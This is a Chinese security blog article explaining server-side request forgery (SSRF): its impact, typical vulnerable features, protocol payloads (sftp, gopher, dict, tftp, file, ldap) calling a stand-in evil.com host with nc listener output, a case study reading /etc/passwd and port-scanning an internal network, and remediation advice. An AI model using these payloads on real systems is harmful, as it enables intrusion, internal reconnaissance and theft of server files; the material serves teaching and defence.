\> 本文由 \[简悦 SimpRead\](http://ksria.com/simpread/) 转码， 原文地址 \[mp.weixin.qq.com\](https://mp.weixin.qq.com/s/pop\_rIIYMrAwi0ifUMl5uQ)

点击上方 “蓝字” 关注公众号获取最新信息!

> 本文作者：梭哈王、小米粥（贝塔安全实验室 - 核心成员）

* * *

By：梭哈王、小米粥

参考文章:

https://xz.aliyun.com/t/2115#toc-2

https://\_thorns.gitbooks.io/sec/content/ssrf\_tips.html

**一：****漏洞概念**

SSRF 全称为 Server-side Request Fogery, 中文含义为服务器端请求伪造，漏洞产生的原因是服务端提供了能够从其他服务器应用获取数据的功能，比如从指定的 URL 地址获取网页内容，加载指定地址的图片、数据、下载等等。

一般情况下，我们服务端请求的目标都是与该请求服务器处于同一内网的资源服务，但是如果没有对这个请求的目标地址、文件等做充足的过滤和限制，攻击者可通过篡改这个请求的目标地址来进行伪造请求，所以这个漏洞名字也叫作 “服务器请求伪造”。

  

**二：漏洞危害**

1、可以对服务器所在的内网、本地进行端口扫描，获取一些服务的 banner 信息

2、攻击运行在内网或本地的应用程序（比如溢出）

3、对内网 web 应用进行指纹识别，通过访问应用存在的默认文件实现；

4、攻击内外网的 web 应用，主要是使用 get 参数就可以实现的攻击（比如 struts2 漏洞利用等）

5、利用 file 协议读取本地文件

6、利用 Redis 未授权访问，HTTP CRLF 注入达到 getshell

7、DOS 攻击（请求大文件，始终保持连接 keep alive always）等等

**三：****漏洞出现点**  

1、 通过 url 地址分享网页内容功能处

2、转码服务

3、在线翻译

4、图片加载与下载 (一般通过 url 地址加载或下载图片处)

5、图片、文章收藏功能

6、未公开的 api 实现以及其他调用 url 的功能

7、云服务器商 (它会远程执行一些命令来判断网站是否存活等，所以如果可以捕获相应的信息，就可以进行 ssrf 测试)

8、有远程图片加载的地方 (编辑器之类的远程图片加载处)

9、网站采集、网页抓取的地方 (一些网站会针对你输入的 url 进行一些信息采集工作)

10、头像处 (某易就喜欢远程加载头像，例如: http://www.xxxx.com/image?url=http://www.image.com/1.jpg)

11、邮件系统 (比如接收邮件服务器地址)

12、编码处理, 属性信息处理，文件处理 (比如 ffpmg，ImageMagick，docx，pdf，xml 处理器等)

13、从远程服务器请求资源（upload from url 如 discuz！；import & expost rss feed 如 web blog；使用了 xml 引擎对象的地方 如 wordpress xmlrpc.php）

**四：****SSRF 利用支持协议以及利用方式**

1、sftp  

```
sftp(http://xxx.com/ssrf.php?url=sftp://evil.com:11111/   evil.com:$ nc -v -l 11111
Connection from \[192.168.0.10\] port 11111 \[tcp/\*\] accepted (family 2, sport 36136)
SSH-2.0-libssh2\_1.4.2
)
```

2、gopher

```
gopher(http://xxx.com/ssrf.php?url=http://evil.com/gopher.php
<?php
header('Location: gopher://evil.com:12346/\_HI%0AMultiline%0Atest');
?>
evil.com:# nc -v -l 12346
Listening on \[0.0.0.0\] (family 0, port 12346)
Connection from \[192.168.0.10\] port 12346 \[tcp/\*\] accepted (family 2, sport 49398)
HI
Multiline
test)
```

3、dict

```
dict(http://xxx.com/ssrf.php?dict://attacker:11111/  evil.com:$ nc -v -l 11111
Connection from \[192.168.0.10\] port 11111 \[tcp/\*\] accepted (family 2, sport 36136)
CLIENT libcurl 7.40.0)
```

4、file

```
file(http://xxx.com/redirect.php?url=file:///etc/passwd)
```

5、tftp

```
tftp(http://xxx.com/ssrf.php?url=tftp://evil.com:12346/TESTUDPPACKET evil.com:# nc -v -u -l 12346
Listening on \[0.0.0.0\] (family 0, port 12346)
TESTUDPPACKEToctettsize0blksize512timeout)
)
```

6、http/https

```
http/https(http://safebuff.com/redirect.php?url=http://ip:port)
```

7、ldap

```
ldap(http://xxxx.com/redirect.php?url=ldap://localhost:11211/%0astats%0aquit)
```

‍

**五：****漏洞验证**  

1、排除法：浏览器 f12 查看源代码看是否是在本地进行了请求

比如：该资源地址类型为 http://www.xxx.com/a.php?image=URL,URL 参数若是其他服务器地址就可能存在 SSRF 漏洞

2、dnslog 等工具进行测试，看是否被访问 (可以在盲打后台，用例中将当前准备请求的 url 和参数编码成 base64，这样盲打后台解码后就知道是哪台机器哪个 cgi 触发的请求)

3、抓包分析发送的请求是不是通过服务器发送的，如果不是客户端发出的请求，则有可能是存在漏洞。接着找存在 HTTP 服务的内网地址

3.1、从漏洞平台中的历史漏洞寻找泄漏的存在 web 应用内网地址

3.2、通过二级域名暴力猜解工具模糊猜测内网地址

3.3、通过 file 协议读取内网信息获取相关地址

4、直接返回的 Banner、title、content 等信息

5、留意布尔型 SSRF，通过判断两次不同请求结果的差异来判断是否存在 SSRF，类似布尔型 sql 盲注方法。

**六：****漏洞案例**  

1）在一次进入系统后台测试过程中，存在一处创建工单的功能。

![](https://mmbiz.qpic.cn/mmbiz_png/lFOEJLHA9ql1HIszCIcKFnbhgOqaeWzVonzbRLtso7zCR3u8L4p4iburJ56KMZfMsrm7pqTyDYSGRYCVfqE3USQ/640?wx_fmt=png)

2）创建完工单如下所示:

![](https://mmbiz.qpic.cn/mmbiz_png/lFOEJLHA9ql1HIszCIcKFnbhgOqaeWzVZJdo9LL39elicbfLeN19TZMRedz2IRxdl3LicTzuNO4HeosPFUib4jtrg/640?wx_fmt=png)

3）我们点击我们工单上传的文件，点击查看文件，发现 filename 参数指向内网的 10.180.103.x 的服务器资源，猜测应该是存在 ssrf 漏洞，访问几个已知存在的内网资源 (10.180.163 网段之前测试有 shell 上传了，所以只要该处能访问我的 shell 上传的文件即可判断)，实测有效。

![](https://mmbiz.qpic.cn/mmbiz_png/lFOEJLHA9ql1HIszCIcKFnbhgOqaeWzVIMBicedQIGq9gVicHN4x0LqZBhbtPIFlbfDiaj60ictoTy6UmdbM9fQDNw/640?wx_fmt=png)

4）利用 file 协议读取服务器的 / etc/passwd 文件。

![](https://mmbiz.qpic.cn/mmbiz_png/lFOEJLHA9ql1HIszCIcKFnbhgOqaeWzV3vgwHm6qFTEv2CdQr93mVSryZaocicZoQgOStud6NtVICUXzpvN2FEw/640?wx_fmt=png)

5）利用 file 协议读取文件目录。

![](https://mmbiz.qpic.cn/mmbiz_png/lFOEJLHA9ql1HIszCIcKFnbhgOqaeWzVqo2j4IgjicFdicW4vKyicxwlbUicRFa5IaQCtHPFibHkFFf7UTLX66OeBNw/640?wx_fmt=png)

6）利用 http 协议探测内网端口开放信息：

filename=http://127.0.0.1:21(22 等等端口)，对端口进行扫描。

![](https://mmbiz.qpic.cn/mmbiz_png/lFOEJLHA9ql1HIszCIcKFnbhgOqaeWzVDYktMAia5sV0Pjxpjh3sD4HmFTWUv9UGMf1mQQhcccoxPdU2fRoEnSw/640?wx_fmt=png)

**七：****漏洞修复**  

1、过滤返回信息，验证远程服务器对请求的响应是比较容易的方法。如果 web 应用是去获取某一种类型的文件，那么在把返回结果展示给用户之前先验证返回的信息是否符合标准。

2、禁用不需要的协议，仅仅允许 http 和 https 请求。可以防止 file/gopher/dict 等协议引起的问题

3、设置 URL 白名单或者限制内网 IP（使用 gethostbyname() 判断是否为内网 IP）

4、限制请求的端口为 http 常用的端口，比如 80、443、8080、8090

5、统一配置错误信息，避免用户可以根据错误信息来判断远程服务器的端口状态。

****![](https://mmbiz.qpic.cn/mmbiz_png/83e7tQTo0wPqZBQGoIee5SUPvSghllp2hRZ6cX9rViaT6ibibciaiamMicNoVsmAqgwhbQ2vvvq7eSGxTlX0g6qEFVaw/640?wx_fmt=png)****

↑↑↑**长按**图片**识别二维码**关註↑↑↑